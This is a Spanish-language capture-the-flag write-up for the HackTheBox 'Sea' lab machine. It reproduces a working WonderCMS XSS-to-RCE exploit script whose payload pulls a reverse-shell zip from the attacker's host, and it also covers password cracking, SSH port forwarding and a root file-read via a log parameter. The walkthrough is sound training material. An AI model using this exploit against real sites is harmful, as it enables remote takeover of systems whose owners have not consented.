---
title: Sea WriteUp
author: iv4sh
date: 2024-11-03 14:00:00 +0800
categories: [HackTheBox, Easy]
tags: [XSS, RCE, LFI]
render_with_liquid: false
description: Guia didáctica para la resolución de la maquina **Sea** de HackTheBox
---

>El siguiente WriteUp fue creado con el propósito de guiar la resolución de la maquina `Sea` de HackTheBox, además de fomentar una explicación clara de los conceptos, herramientas y vulnerabilidades vistas.

![SeaBanner](/assets/img/sea/Sea.png)

* **Maquina:** Sea 🚲
* **Plataforma:** Hack The Box
* **Dificultad:** Fácil 😀
* **Vulnerabilidades:** Cross Site Scripting(XSS), Remote Code Execution(RCE) y Local File Inclusion(LFI)
* **Habilidades:** Enumeración de directorios, desencriptado y port fordwarding

Sea es una maquina linux ideal para la practica de enumeración de directorios y elementos de una pagina web, en esta nos encontraremos con una vulnerabilidad en la versión del sistema de gestión de documentos, vulnerabilidad que nos permite una ejecución remota de comandos mediante la ejecución de un XSS. Posteriormente podremos listar los contenidos del sistema y ejecutar ciertos comandos como un usuario privilegiado.

---
## **Fase de reconocimiento**

* **IP atacante**: 10.10.16.76
* **IP victima**: 10.10.11.28

>Debemos recordar que algunos comandos deben ejecutarse como usuario privilegiado por lo tanto es aconsejable ser root durante todo el proceso.

Lo primero que tenemos hacer una vez establecida la conexión con la maquina es un escaneo de los puertos que esta tiene activos con el uso de la herramienta `nmap`.
```bash
nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.11.28 -oG allPorts
```
Cada parámetro tiene la siguiente utilidad:
`nmap`: Herramienta para el escaneo de puertos.
`-p-`: Escaneara los 65535 puertos.
`--open`: Filtra por los puertos abiertos.
`-sS`: Modo de escaneo sigiloso y rápido ya que no termina la conexión con el host.
`--min-rate`: Establece un mínimo de paquetes enviados en este caso 5000, cosa que agiliza el escaneo.
`-n`: No aplica resolución DNS.
`-Pn`: Da por hecho que el host esta activo.
`10.10.11.28`: IP de la maquina victima.
`-oG`: exporta el resultado del escaneo en formato 'grepeable' al archivo allPorts.

Su ejecución reporta los siguientes puertos abiertos:  
![allports](/assets/img/sea/allports.png)  
para extraer los puertos activos podemos usar el siguiente comando:
```bash
grep -oP '\d{1,5}/open' allPorts | awk '{print $1}' FS="/" | xargs | tr ' ' ',' | xclip -sel clip
```
Este comando hace uso de **expresiones regulares** para extraer los puertos del archivo **allPorts** y copiarlos en la **clipboard**, debemos tener en cuenta que `xclip` este instalado.

Ahora vamos a hacer un escaneo exhaustivo sobre los puertos extraídos  previamente
```bash
nmap -p22,80 -sCV 10.10.11.28 -oN targeted
```
Usamos el parámetro `-sCV` para enviar ciertos scripts de reconocimiento a esos puertos y extraer la versión y el servicio que corre sobre cada puerto. Obteniendo así la siguiente información:  
![targeted](/assets/img/sea/targeted.png)  
Tenemos el el servicio de SSH corriendo sobre el puerto 22 y un pagina web HTTP corriendo en el puerto 80, de momento sin información relevante y vulnerabilidades en sus respectivas versiones.

---
## **Enumeración Web**

Accedemos a la pagina web digitando la dirección IP de la maquina victima en el buscador de nuestra preferencia.  
![Page](/assets/img/sea/PageIP.png)

Observamos un pagina bastante básica con solo dos enlaces a la vista **HOME** y **HOW TO PARTICIPATE**. En la descripción de la segunda observamos un enlace hacia un archivo `contact.php` al cual no tenemos acceso pues nos indica que la pagina no resuelve al dominio `sea.htb` por lo que agregamos el dominio al archivo `/etc/hosts`
```bash
echo "10.10.11.28 sea.htb" >> /etc/hosts
```
Ahora ya podemos observar la pagina `http://sea.htb/contact.php` pero le prestaremos atención mas adelante. **SPOILER**: Aquí es donde se acontece el XSS, pero antes debemos conocer la vulnerabilidad que hace esto posible. 

### Enumeración de Directorios

Vamos a enumerar los directorios disponibles con el uso de la herramienta `GoBuster`
```bash
gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 10.10.11.28 -x php,html,txt -t 100 2>/dev/null
```

| Parámetro     | Descripción                                                                      |
| ------------- | -------------------------------------------------------------------------------- |
| `gobuster`    | Herramienta para la enumeración de directorios, subdominios, etc.                |
| `dir`         | especifica la búsqueda de directorios.                                           |
| `-w`          | Especifica la ruta del diccionario a usarse, en este caso uno del **SecLists**.  |
| `-u`          | Especifica la **URL** victima.                                                   |
| `-x`          | Busca archivos con las extensiones señaladas.                                    |
| `-t`          | Uso de hilos agilizar la búsqueda. Hacer uso de muchos puede bajar la precisión. |
| `2>/dev/null` | Para que no impriman los errores en pantalla.                                    |

Mediante el escaneo encontramos los siguientes directorios y archivos:  
![Page](/assets/img/sea/GoBuster1.png)  
Nuestro directorio de interés es **themes** al cual no tenemos acceso dado el código que devuelve, pero del cual podemos seguir listando subdirectorios y archivos.  
![Page](/assets/img/sea/GoBuster2Theme.png)  
Observamos que tenemos un tema **bike** un archivo **version** el cual podemos observar ingresando a la ruta `http://sea.htb/themes/bike/version`. Vemos la versión `3.2.0`, ahora resta averiguar el gestor de contenidos de la pagina a la que pertenece ese tema y versión.
Mediante una búsqueda del tema en Google nos topamos con que este tema pertenece a **WonderCMS**.  
![Page](/assets/img/sea/WonderCMS.png)  
>`Wonder CMS` es un gestor de contenidos (CMS) de código abierto y gratuito que permite crear y editar sitios web, blogs o páginas de aterrizaje: 
- Es un CMS de archivos planos que es rápido, responsivo y no requiere configuración 
- Es un CMS pequeño y sencillo que se instala fácilmente 
- No requiere configuración inicial 
- Todos los archivos se pueden mover, respaldar y restaurar mediante copia y pegado

---
## Fase de Explotación

### Fase 1: Preparación

Buscamos vulnerabilidades para la versión del gestor de la pagina victima.
Encontramos el siguiente reporte en el siguiente repositorio del usuario 'prodigiusMind': [CVE-2023-41425](https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413)
#### ¿Cómo Funciona?

La vulnerabilidad encontrada es un `Cross Site Scrpting` que se ejecuta en el sitio donde esta alojado el gestor de contenido WonderCMS. Esto pone la mira sobre el sitio `http://sea.htb/contact.php`.
* `XSS`: el Cross Site Scripting es una vulnerabilidad de seguridad en aplicaciones web que permite a un atacante inyectar scripts maliciosos en páginas web. Permite al atacante ejecutar código **JavaScript** u otros scripts en el navegador del **usuario** o la **web** en general.
Para este caso esta vulnerabilidad se aprovecha de la capacidad de la web para la instalación de nuevos módulos en los temas de la pagina, aquí es donde subimos un archivo malicioso llamado xss.js que es el encargado de enviarnos una **ReverShell** a nuestra maquina. Para hacer esto efectivo debemos preparar lo siguiente:
1. Modificamos el exploit.py
2. Modificamos una ReverShell - rev.php

##### Modificación del exploit.py

Podemos copiar el exploit.py desde el [repositorio oficial](https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413) pero debemos tomar en cuenta el modificar la línea `var urlRev` por la siguiente:
```python
# ORIGINAL
var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;
# MODIFICADA CON TU IP - Servidor local
var urlRev = "http://sea.htb/wondercms/?installModule=http://<IPatacante>:8000/revshell-main.zip&directoryName=violet&type=themes&token=" + token;
```
El resultado del script con la línea modificada es el siguiente:
```python
# Exploit: WonderCMS XSS to RCE
import sys
import requests
import os
import bs4

if (len(sys.argv)<4): print("usage: python3 exploit.py loginURL IP_Address Port\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252")
else:
  data = '''
var url = "'''+str(sys.argv[1])+'''";
if (url.endsWith("/")) {
 url = url.slice(0, -1);
}
var urlWithoutLog = url.split("/").slice(0, -1).join("/");
var urlWithoutLogBase = new URL(urlWithoutLog).pathname;
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = "http://sea.htb/wondercms/?installModule=http://10.10.16.76:8000/revshell-main.zip&directoryName=violet&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {
 if (xhr3.status == 200) {
   var xhr4 = new XMLHttpRequest();
   xhr4.withCredentials = true;
   xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");
   xhr4.send();
   xhr4.onload = function() {
     if (xhr4.status == 200) {
       var ip = "'''+str(sys.argv[2])+'''";
       var port = "'''+str(sys.argv[3])+'''";
       var xhr5 = new XMLHttpRequest();
       xhr5.withCredentials = true;
       xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
       xhr5.send();

     }
   };
 }
};
'''
  try:
    open("xss.js","w").write(data)
    print("[+] xss.js is created")
    print("[+] execute the below command in another terminal\n\n----------------------------\nnc -lvp "+str(sys.argv[3]))
    print("----------------------------\n")
    XSSlink = str(sys.argv[1]).replace("loginURL","index.php?page=loginURL?")+"\"></form><script+src=\"http://"+str(sys.argv[2])+":8000/xss.js\"></script><form+action=\""
    XSSlink = XSSlink.strip(" ")
    print("send the below link to admin:\n\n----------------------------\n"+XSSlink)
    print("----------------------------\n")

    print("\nstarting HTTP server to allow the access to xss.js")
    os.system("python3 -m http.server\n")
  except: print(data,"\n","//write this to a file")
```
##### Modificación del rev.php

Para este paso descargaremos una ReverShell de la siguiente fuente: [pentestmonkey.net](https://pentestmonkey.net/tools/web-shells/php-reverse-shell). Aquí descargaremos un comprimido `php-reverse-shell-1.0.tar.gz` que debemos descomprimir y eliminar los archivos innecesarios. Por ultimo renombrar el archivo `php-reverse-shell.php` como `rev.php` y comprimirlo en un archivo zip llamado `revshell-main.zip`. El cambio de estructura se vería algo así:  
![rev](/assets/img/sea/rev.png)  
>Dentro del archivo rev.php no hacemos ninguna modificación, sin embargo debemos tomar el puerto, en este caso, el 1234.

### Fase 2: Ejecución

Movemos tanto el `exploit.py` y el comprimido `revshell-main.zip` a un mismo directorio. posteriormente ejecutamos el script en Python con los siguientes parámetros:
```bash
python3 exploit.py "http://sea.htb/wondercms?page=index.php" 10.10.16.76 1234
```
`Python3`: Al ser un script de Python lo ejecutamos como tal, con la versión de Python 3.
`exploit.py`: Script del exploit que modificamos.
`URL`: Dirección del sitio que contiene el WonderCMS.
`10.10.17.76`: IP del atacante.
`1234`: Puerto de acceso, es el mismo que en el archivo **rev.php**.

**Después de la ejecución debemos seguir los siguientes pasos**:

1. Abrirá un servidor local en el puerto 8000 -> 127.0.0.1:8000
2. Creara un archivo xss.js que será el archivo que ejecute el Cross Site Scripting.
3. Nos pedirá que nos pongamos en escucha por el puerto `1234` vía **netcat**.
![Page](/assets/img/sea/NC.png)  
5. Generara un link que debemos copiar en la pagina `http://sea.htb/contact.php` en el campo ****website***.
![Page](/assets/img/sea/XSS.png)  
6. Esperaremos con el puerto aun en escucha, mientras la pagina hace las solicitudes del archivo zip y ejecuta el rev.php.
7. Es importante no detener la ejecución del script hasta que tengamos acceso a la shell.

El script ejecutado al 100% se vera de la siguiente manera:
![Page](/assets/img/sea/exploit.png)  

---
## User Flag

Con el proceso de explotación anterior obtuvimos una ReverShell como el usuario **www-data**. Este usuario y grupo de sistema es creado comúnmente en sistemas basados en Linux para ejecutar servicios web como **Apache** y **Nginx**. Su ruta dentro del sistema es comunmente la `/var/www/`.
Aquí podemos explorar los archivos propios de la pagina como los directorios que antes no teníamos permisos de **Directory Listig** como por ejemplo el directorio themes y data. En este ultimo es donde encontramos la siguiente base de datos:  
![Page](/assets/img/sea/database.png)  
y si por fin tenemos una contraseña de acceso aunque encriptada, asi que ahora vamos a buscar los usuarios existentes para saber a quien pertenece esta contraseña con el comando:
```bash
cat /etc/passwd | grep bash
```
Este comando leerá el archivo passwd, archivo que contiene todos los usuarios del sistema y los filtrara por aquellos que tengan una terminal bash asignada de esa forma encontramos 3 usuarios:
* amay: usuario común.
* geo: usuario común.
* root: usuario privilegiado.
### Desencriptación

Primero debemos identificar que tipo de encriptación tiene nuestro hash. Si observamos el hash, este comienza con la siguiente sintaxis `$2y$` sintaxis que mediante una búsqueda sencilla sigue el patrón `$2*$` que pertenece a una encriptación de tipo **`bcrypt`**.
Sabiendo esto podemos usar la herramienta `john` con el diccionario `rockyou.txt`. Primero debemos tomar en cuenta quitar los signos `\` del hash puesto que escapan los caracteres especiales y ponerlo en un archivo **hash.txt**. Posteriormente, ejecutar el comando de la siguiente manera:
```bash
john --format=bcrypt --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
```

| Parámetro    | Descripción                                       |
| ------------ | ------------------------------------------------- |
| `john`       | Herramienta de desencriptado.                     |
| `--format=`  | tipo de desencriptado.                            |
| `--wordlist` | Diccionario de contraseñas, en este caso rockyou. |
| `hash.txt`   | Archivo que contiene el hash                      |

![Page](/assets/img/sea/hash.png)  
### Acceso SSH

Let's go, tenemos la contraseña del usuario 'amay', dado que el puerto 22 esta abierto tenemos el servicio de SSH disponible por lo que establecemos la conexión de la siguiente manera:
```bash
ssh amay@10.10.11.28
# Escribimos 'yes' en la consulta para indicar que seguiremos conectados directamente al servidor
# Escribimos la contraseña que obtuvimos previamente

# Una vez dentro ejecutamos el siguiente comando para poder limpiar la pantalla con Ctrl+l y movernos entre caracteres
export TERM=xterm
```
Ya con acceso total como el usuario 'amay' buscamos la Flag de usuario en el directorio personal del usuario `/home/amay/user.txt`.

---
## Root Flag

Podemos hacer una enumeración para encontrar alguna vía para escalar nuestros privilegios ya sea buscando por binarios con permisos SUID o capabilities pero para este caso nuestro objetivo esta en los servicios internos de la maquina. Por lo que usaremos el siguiente comando:
```bash
netstat -tuln
```

| Parámetro | Descripción                                                                                                              |
| --------- | ------------------------------------------------------------------------------------------------------------------------ |
| `netstat` | Muestra información sobre las conexiones de red actuales y los puertos abiertos en los que el sistema está "escuchando". |
| `-t`      | Muestra las conexiones de tipo **TCP**.                                                                                  |
| `-u`      | Muestra las conexiones de tipo **UDP**.                                                                                  |
| `-l`      | Filtra por los puertos en modo escucha.                                                                                  |
| `-n`      | Muestra los resultados en formato numérico envés de resolver a los **DNS**.                                              |

Es los resultados del comando podemos observar los siguientes resultados:  
![Page](/assets/img/sea/netstat.png)  
De estos llama la atención el `127.0.0.1:8080` por lo que aplicaremos **Port-Forwarding** para acceder al puerto interno, de manera local desde nuestra maquina.

### Port Forwarding

>**Port Forwarding** o **redirección de puertos** es una técnica que permite reenviar o redirigir el tráfico de red de un puerto específico de una dirección IP pública hacia otro puerto de una dirección IP privada (por ejemplo a local)

Cerraremos la sesión actual de SSH para acceder de la siguiente manera:
```bash
ssh -L 8081:localhost:8080 amay@10.10.11.28
```
`-L` Señala a nuestro puerto 8081 como el puerto 8080 maquina victima de esta forma podremos acceder al de manera local al servicio interno que la misma.

Una vez accedemos a la dirección `127.0.0.1:8081` nos pedirá unas **credenciales**, que son las misma que usamos para acceder como el usuario amay; y observaremos la siguiente interfaz:
![Page](/assets/img/sea/logsystem.png)  
En esta interfaz podremos listar el contenido de ciertos **logs**, archivos que registran cada petición hecha al servidor. Por lo que para ver como funciona lo interceptaremos la petición que realiza el botón `Analyze` con la aplicación **`BURPSUIT`**. Debemos recordar
De no conocer como configurar **BurpSuit** visitar el siguiente enlace a la pagina oficial: [PortSwigger](https://portswigger.net/burp/documentation/desktop/getting-started)  
### Local File Inclusion

Una vez interceptado observamos la siguiente petición vía **POST**  
![Page](/assets/img/sea/burpintercept.png)  
Vemos que mediante el parámetro **log_file** la pagina hace una petición que imprime el contenido de la ruta: `var/log/apache2/access.log`
Ruta que no es accesible por un usuario sin privilegios, por lo que concluimos que la pagina ejecuta dicha instrucción como **root**.

Con esta información probamos listar el contenido de diferentes archivos concatenado la impresión del **log** con otras instrucciones desde el modo **Repeater** de BurpSuit. Consiguiendo finalmente la Flag de root al imprimir la ruta `/root/root.txt`.  
![Page](/assets/img/sea/rootflag.png)  
Por ultimo nos daremos cuenta que podemos ejecutar ciertos comandos como root, pero en mi caso no encontré la forma de establecer una ReverShell privilegiada.  
![Page](/assets/img/sea/comandexe.png)  
---

> **GG!** Espero hayan disfrutado siguiendo de este WriteUp y que hayan aprendido los conceptos aplicados. Buena suerte :)